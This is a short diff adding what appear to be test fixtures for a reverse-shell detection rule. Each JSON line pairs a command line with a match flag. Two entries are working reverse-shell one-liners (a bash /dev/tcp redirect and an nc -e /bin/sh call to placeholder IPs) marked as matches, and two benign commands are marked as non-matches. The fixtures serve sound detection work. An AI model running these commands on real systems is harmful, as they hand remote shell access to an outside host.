@@ -1,0 +1,4 @@
+{"CommandLine": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "_match": true}
+{"CommandLine": "nc -e /bin/sh 192.168.1.100 4444", "_match": true}
+{"CommandLine": "ls -la /var/www/html", "_match": false}
+{"CommandLine": "apt-get update", "_match": false}
